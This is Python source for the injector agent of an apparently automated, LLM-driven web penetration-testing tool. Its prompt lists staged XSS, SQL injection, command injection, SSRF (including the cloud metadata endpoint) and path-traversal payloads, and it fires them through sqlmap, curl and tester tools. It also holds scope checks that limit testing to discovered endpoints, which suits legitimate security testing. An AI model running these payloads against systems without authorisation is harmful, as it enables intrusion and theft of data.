"""
Injector Agent - Injects payloads into discovered forms and parameters
Works with Checklist agent to get current test directive and Observer agent for feedback
"""
from langchain_core.messages import SystemMessage, HumanMessage
from states.agent_state import AgentState
from utils.ansi import MAGENTA, GREEN, RED, YELLOW, RESET
from utils.reasoning import ReasoningDisplay
from utils.toolbind import run_tool_loop
from tools.executor import execute
from tools.xss_tester import test_xss_payloads
from tools.sqli_tester import test_sqli, quick_sqli_check
from tools.command_injection_tester import test_command_injection, quick_command_injection_check
import json


def injector_node(state: AgentState, orch=None):
    """
    Injector agent that:
    1. Receives test directive from checklist agent
    2. Selects appropriate payload based on current round
    3. Injects payload into target form/parameter
    4. Returns injection details to observer agent
    5. Uses session_data for authenticated testing
    """
    
    print(f"{MAGENTA}[>][injector]{RESET} Preparing payload injection...", flush=True)
    
    # Get directives from checklist
    checklist_directive = state.get('checklist_directive', {})
    next_test = checklist_directive.get('next_test', {})
    
    # Get modifier suggestions (encoded/modified payloads)
    modifier_suggestions = state.get('modifier_suggestions', [])
    
    # Get encoder-provided payload (highest priority)
    encoded_payload = state.get('encoded_payload', '')
    encoding_technique = state.get('encoding_technique', 'none')
    encoder_attempts = state.get('encoder_attempts', 0)
    
    # IMPORTANT: Retrieve session data for authenticated testing
    session_data = state.get('session_data', {})
    authenticated = state.get('authenticated', False)
    if authenticated and session_data:
        print(f"{GREEN}[+][injector]{RESET} Using authenticated session ({state.get('auth_method', 'unknown')})", flush=True)
    
    # Determine current payload round
    payload_round = next_test.get('payload_round', 1)
    test_category = next_test.get('category', 'XSS')
    target_url = next_test.get('target', state.get('current_test_url', orch.host if orch else ''))
    parameter = next_test.get('parameter', 'q')
    
    # CRITICAL: Validate target URL against feroxbuster whitelist
    feroxbuster_endpoints = state.get('feroxbuster_endpoints', [])
    if feroxbuster_endpoints:
        valid_urls = {ep.get('url') if isinstance(ep, dict) else ep for ep in feroxbuster_endpoints}
        
        if target_url not in valid_urls:
            print(f"{RED}[!][injector] ERROR: Target URL not in feroxbuster-discovered endpoints{RESET}")
            print(f"{RED}[!] Target: {target_url}{RESET}")
            print(f"{RED}[!] Valid URLs: {', '.join(list(valid_urls)[:5])}{RESET}")
            print(f"{RED}[!] INJECTOR WILL NOT TEST ASSUMED ENDPOINTS{RESET}\n")
            return {
                'injection': f'ERROR: Target URL {target_url} not discovered by feroxbuster',
                'test_result': {
                    'success': False,
                    'error': 'Target not in feroxbuster results',
                    'target': target_url
                }
            }
    else:
        print(f"{YELLOW}[!][injector] WARNING: No feroxbuster whitelist available{RESET}")
    
    # CRITICAL: Prevent blind parameter testing when NO forms discovered
    discovered_inputs = state.get('discovered_inputs', [])
    if not discovered_inputs and not (encoded_payload and encoder_attempts > 0):
        # No validated forms/inputs found AND no encoder payload
        # Refuse to test blind parameters like ?q= on login or unknown endpoints
        print(f"{RED}[!][injector] ERROR: No discovered forms or validated parameters{RESET}")
        print(f"{RED}[!] REFUSING blind parameter testing on {target_url}{RESET}")
        print(f"{RED}[!] Blind testing on unvalidated endpoints is disabled{RESET}\n")
        return {
            'injection': f'ERROR: Cannot proceed - no forms/parameters discovered on {target_url}',
            'test_result': {
                'success': False,
                'error': 'No discovered forms or validated parameters to test',
                'target': target_url,
                'reason': 'blind_parameter_testing_disabled'
            }
        }
    
    # If we get here, the target is valid and has discovered forms/parameters
    
    # If encoder provided a payload, use it
    if encoded_payload and encoder_attempts > 0:
        print(f"{MAGENTA}[*][injector]{RESET} Using ENCODED payload (attempt {encoder_attempts}): {encoding_technique}", flush=True)
        payload_to_use = encoded_payload
        payload_source = f'encoder-{encoding_technique}'
    else:
        print(f"{MAGENTA}[*][injector]{RESET} Round {payload_round} - Testing {test_category} on parameter '{parameter}'", flush=True)
        payload_to_use = None  # Will be selected by LLM
        payload_source = f'round-{payload_round}'
    
    # Build payload selection prompt
    prompt = f"""You are a Payload Injection Specialist executing security tests.

AUTHENTICATION STATUS:
- Authenticated: {authenticated}
- Auth Method: {state.get('auth_method', 'none') if authenticated else 'N/A'}
- Session Available: {bool(session_data)}

CURRENT TEST DIRECTIVE:
- Category: {test_category}
- Target: {target_url}
- Parameter: {parameter}
- Payload Round: {payload_round} of 5
- Test Type: {next_test.get('test_type', 'unknown')}

MODIFIER SUGGESTIONS (if any):
{json.dumps(modifier_suggestions, indent=2) if modifier_suggestions else 'No modifications suggested yet'}

ENCODED PAYLOAD (if provided by encoder agent):
{f"Encoded Payload: {encoded_payload}" if encoded_payload else "No encoded payload - use standard payload selection"}
{f"Encoding Technique: {encoding_technique}" if encoded_payload else ""}
{f"Encoder Attempt: {encoder_attempts}" if encoded_payload else ""}

FAILED ATTEMPTS (from checklist):
{json.dumps(state.get('checklist_state', {}).get('failed_attempts', {}).get(f"{test_category}_{parameter}", []), indent=2)}

PAYLOAD SELECTION STRATEGY:

Round 1 - Basic Payloads:
  XSS: <script>alert(1)</script>
  SQLi: ' OR '1'='1
  Command: ; whoami
  SSRF: http://127.0.0.1
  Path Traversal: ../../../etc/passwd

Round 2 - Alternative Syntax:
  XSS: <img src=x onerror=alert(1)>
  SQLi: ' OR 1=1--
  Command: | whoami
  SSRF: http://localhost:8080
  Path Traversal: ....//....//etc/passwd

Round 3 - Event Handlers/Encoding:
  XSS: <svg/onload=alert(1)>
  SQLi: admin' --
  Command: ` whoami `
  SSRF: http://169.254.169.254/latest/meta-data/
  Path Traversal: ..%252f..%252fetc/passwd

Round 4 - Context Breaking:
  XSS: "><script>alert(1)</script>
  SQLi: ' UNION SELECT NULL--
  Command: $(whoami)
  SSRF: http://[::1]:80
  Path Traversal: /etc/passwd

Round 5 - Advanced Evasion:
  XSS: <sCrIpT>alert(1)</sCrIpT>
  SQLi: ' AND SLEEP(5)--
  Command: & whoami &
  SSRF: http://2130706433 (decimal IP)
  Path Traversal: ../..///..////etc/passwd

YOUR TASK:
1. **CRITICAL**: If encoded_payload is provided, USE IT instead of selecting a new one
2. If modifier suggested encoded versions and no encoder payload, prioritize those
3. If no encoder/modifier payloads, use DIFFERENT payload for each round (don't repeat)
4. For current round, select the corresponding payload variation from examples above
5. Prepare injection command using available tools
6. Return injection details for observer

PRIORITY ORDER:
1. Encoded payload from encoder agent (highest priority)
2. Modified payload from modifier agent
3. Standard payload selection for current round

CURRENT ROUND: {payload_round}/5
PAYLOAD SOURCE: {payload_source}
PREVIOUSLY TESTED: Check failed_attempts to avoid duplicates

IMPORTANT: Each round MUST use a different payload. Vary syntax, encoding, and technique.

AVAILABLE TOOLS:
- test_sqli(url=\"...\", parameter=\"...\", method=\"GET/POST\") - VERIFIED SQLi testing with sqlmap (use for SQLi)
- quick_sqli_check(url=\"...\") - Quick SQLi error detection
- test_command_injection(url=\"...\", parameter=\"...\", method=\"GET/POST\") - VERIFIED command injection testing
- quick_command_injection_check(url=\"...\") - Quick command injection check
- test_xss_payloads(url=\"...\", method=\"GET/POST\", post_data=\"...\") - VERIFIED XSS testing (requires execution proof)
- execute(cmd=\"...\", session_data={json.dumps(session_data) if session_data else 'null'}) - Run command line tools with authentication

CRITICAL - USE THE RIGHT TOOL FOR EACH VULNERABILITY TYPE:
- SQLi → test_sqli() - Requires database access proof, not just errors
- Command Injection → test_command_injection() - Requires command output, not just errors
- XSS → test_xss_payloads() - Requires JavaScript execution, not just reflection
- Other tests → execute() with appropriate tools

IMPORTANT FOR AUTHENTICATED TESTING:
{f"⚠️ SESSION ACTIVE - Always pass session_data={json.dumps(session_data)} to execute() calls to inject authentication headers into curl commands" if authenticated and session_data else "No authentication active for this test"}
- When using execute() with curl commands, include session_data to automatically inject cookies/bearer tokens
- This ensures all payloads are tested in authenticated context

IMPORTANT: 
- For SQLi testing, use test_sqli() - it provides VERIFIED results with database access proof
- For Command Injection, use test_command_injection() - verifies actual command execution
- For XSS, use test_xss_payloads() - verifies JavaScript execution, not just reflection
- For other vulnerabilities, use execute() with appropriate tools

OUTPUT FORMAT (JSON):
{{
  "payload_selected": "actual payload string",
  "injection_method": "GET parameter" | "POST data" | "Header" | "Cookie",
  "target_url": "full URL with payload",
  "tool_command": "exact command to execute",
  "expected_indicators": ["what observer should look for"],
  "encoding_applied": "none" | "url" | "base64" | "hex" | "unicode"
}}

CRITICAL: Your response MUST be ONLY valid JSON. Do not include explanations before or after the JSON.
Start your response with {{ and end with }}.

Select and prepare the payload for injection.
"""
    
    # Prompt is already an f-string, no need for replacements
    
    messages = [
        SystemMessage(content=prompt),
        HumanMessage(content=f"{'USE THE ENCODED PAYLOAD: ' + encoded_payload if encoded_payload else f'Inject round {payload_round} payload for {test_category} testing on {parameter}. MUST use different payload than previous rounds.'}")
    ]
    
    # Execute with tools using run_tool_loop
    tools = [execute, test_xss_payloads, test_sqli, quick_sqli_check, test_command_injection, quick_command_injection_check]
    
    display = ReasoningDisplay("injector", MAGENTA)
    
    try:
        print(f"\n[>] Executing tools...", flush=True)
        print(f"  1. injector", flush=True)
        print(f"     • Round {payload_round} - Testing {test_category}", flush=True)
        print(f"     [~] Running...", flush=True)
        
        if orch and orch.model:
            response, tool_outputs = run_tool_loop(orch.model, tools, messages, max_iters=2)
            injection_result = '\n'.join(tool_outputs) if tool_outputs else response.content
        else:
            response = None
            injection_result = None
        
        print(f"     ✓ Tools completed\n", flush=True)
        print(f"[*] Analyzing results and planning next action...\n", flush=True)
            
        if response:
            content = response.content
            
            # Extract injection plan
            try:
                # Try multiple JSON extraction methods
                if '```json' in content:
                    json_start = content.find('```json') + 7
                    json_end = content.find('```', json_start)
                    json_str = content[json_start:json_end].strip()
                elif '```' in content:
                    json_start = content.find('```') + 3
                    json_end = content.find('```', json_start)
                    json_str = content[json_start:json_end].strip()
                elif '{' in content and '}' in content:
                    json_start = content.find('{')
                    json_end = content.rfind('}') + 1
                    json_str = content[json_start:json_end].strip()
                else:
                    json_str = content.strip()
                
                injection_plan = json.loads(json_str)
                
                # Ensure test_category is included in the plan
                if 'test_category' not in injection_plan:
                    injection_plan['test_category'] = test_category
                
                print(f"{GREEN}[+][injector]{RESET} Payload ready: {injection_plan.get('payload_selected', 'N/A')[:50]}...", flush=True)
                
            except json.JSONDecodeError:
                injection_plan = {
                    'payload_selected': 'Parse error',
                    'test_category': test_category,
                    'raw_response': content
                }
            
            # Log tool execution
            if tool_outputs:
                print(f"{MAGENTA}[*][injector]{RESET} Injection executed, {len(tool_outputs)} tool(s) ran", flush=True)
                
        else:
            content = "Injector unavailable"
            injection_plan = {}
            injection_result = None
            
    except Exception as e:
        print(f"{RED}[-][injector]{RESET} Error: {e}", flush=True)
        content = f"Injection error: {e}"
        injection_plan = {}
        injection_result = None
    
    return {
        'injector': content,
        'injection_plan': injection_plan,
        'injection_result': injection_result,
        'current_payload_round': payload_round
    }
